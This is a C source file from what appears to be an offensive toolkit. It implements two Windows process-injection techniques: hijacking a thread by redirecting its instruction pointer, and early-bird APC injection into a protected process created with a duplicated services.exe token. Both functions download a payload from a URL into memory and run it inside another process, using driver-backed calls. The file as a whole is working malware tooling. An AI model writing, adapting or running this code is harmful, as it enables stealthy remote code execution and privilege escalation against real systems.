#include "offensive.h"
#include "thread.h"
#include "getpayload.h"

#define BUF_SIZE 4096		//Default Max Payload Size

DWORD OphHijackThread(DWORD pid, LPWSTR url) {
	NTSTATUS status;
	HANDLE hProc, hThread;
	CONTEXT ctx;
	LPVOID lpAddress, lpBuffer;
	DWORD dwProtect, tid;
	ctx.ContextFlags = CONTEXT_FULL;
	tid = GetThreadIdFromPID(pid);
	if (!NT_SUCCESS(status=PhOpenProcess(&hProc, pid))) {
		printf("\n[-] Failed to KphOpenProcess: %X", status);
		return -1;
	}
	if (!NT_SUCCESS(status=PhOpenThread(&hThread, tid))) {
		printf("\n[-] Failed to KphOpenThread: %X", status);
		return -1;
	}
	lpAddress = VirtualAllocEx(hProc, NULL, BUF_SIZE, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
	if (lpAddress == 0) {
		printf("\n[-] VirtualAllocEx is failed: %d", GetLastError());
		goto Cleanup;
	}
	lpBuffer = VirtualAlloc(NULL, BUF_SIZE, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE); 
	GetPayloadFromURL(url, lpBuffer, BUF_SIZE);	//Download Payload to Memory
	if (!NT_SUCCESS(status=KphWriteVirtualMemory(hProc, lpAddress, lpBuffer, BUF_SIZE, NULL))) {
		printf("\n[-] Failed to KphWriteVirtualMemory: %X", status);
		goto Cleanup;
	}
	VirtualProtectEx(hProc, lpAddress, BUF_SIZE, PAGE_EXECUTE_READ, &dwProtect);
	OphSuspendProcess(pid);
	KphGetContextThread(hThread, &ctx);
	ctx.Rip = (DWORD_PTR)lpAddress;
	KphSetContextThread(hThread, &ctx);
	OphResumeProcess(pid);

	printf("\n[+] Process %d thread is hijacked to execute payload", pid);

	return 0;

Cleanup:
	if (hThread) CloseHandle(hThread);
	if (hProc) CloseHandle(hProc);
	return -1;
}

DWORD OphEarlyBirdAPCInjection(LPWSTR url) {
	HANDLE hProc, hThread;
	NTSTATUS status;
	WCHAR name[] = L"C:\\windows\\system32\\services.exe";
	LPVOID lpAddress, lpBuffer;
	DWORD dwProtect;
	HANDLE hToken;
	PROCESS_INFORMATION pi;

	OphDuplicateProcessToken(GetPIDFromName(L"services.exe"), &hToken); //Duplicate Primary Token
	OphCreateProtectedProcessWithToken(&pi, hToken);

	lpBuffer = VirtualAlloc(NULL, BUF_SIZE, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);  // Allocate memory for the payload: 1MB
	GetPayloadFromURL(url, lpBuffer, BUF_SIZE);	//Download Payload to Memory

	PhOpenProcess(&hProc, GetProcessId(pi.hProcess));  //We actually neeed PH Driver to open process with full rights
	PhOpenThread(&hThread, GetThreadId(pi.hThread));
	lpAddress = VirtualAllocEx(hProc, NULL, BUF_SIZE, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
	KphWriteVirtualMemory(hProc, lpAddress, lpBuffer, BUF_SIZE, NULL);
	VirtualProtectEx(hProc, lpAddress, BUF_SIZE, PAGE_EXECUTE_READ, &dwProtect);
	printf("\n[+] Protected Shellcode Host Process: %d", pi.dwProcessId);
	QueueUserAPC((PAPCFUNC)lpAddress, hThread, NULL);
	status = KphResumeProcess(hProc);
	if (status != STATUS_SUCCESS) {
		printf("\n[-] Failed to KphResumeProcess: %X", status);
		return -1;
	}
	return 0;
}
